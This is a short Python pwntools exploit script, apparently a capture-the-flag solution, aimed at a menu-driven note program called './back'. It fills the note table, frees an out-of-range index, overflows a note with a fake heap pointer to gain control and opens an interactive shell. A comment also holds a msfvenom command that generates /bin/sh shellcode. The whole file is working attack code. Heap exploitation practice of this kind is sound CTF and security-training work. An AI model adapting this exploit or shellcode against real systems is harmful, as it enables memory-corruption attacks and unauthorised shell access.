#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-04-10 07:10:29
# @Author  : WinterSun (511683586@qq.com)
# @Link    : https://Winter3un.github.io/
import roputils
from pwn import *
context(log_level="debug")
DEBUG = 1
target = "./back"
remote_ip = ""
port = 0
rop = roputils.ROP(target)
bss = rop.section('.bss')
# rop.got('puts')
# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'


if DEBUG:
	p = process(target)
	gdb.attach(p,"b*0x400AD8\nc")
else:
	p = remote(remote_ip,port)

def sl(data):
	p.sendline(data)
def sd(data):
	p.send(data)
def ru(data):
	return p.recvuntil(data)


def add():
	ru("hoice:\n")
	sl("1")
def edit(index,data):
	ru("hoice:\n")
	sl("2")
	ru("hoice:\n")
	sl(str(index))
	ru("note...\n")
	sl(data)
def free(index):
	ru("hoice:\n")
	sl("3")
	ru("hoice:\n")
	sl(str(index))
def view(index):
	ru("hoice:\n")
	sl("4")
	ru("hoice:\n")
	sl(str(index))
for x in range(0,0x80):
	add()
free(0x80)
edit(0x7f,"a"*0x50+p64(0)+p64(0x6020a0))
add()
add()
p.interactive()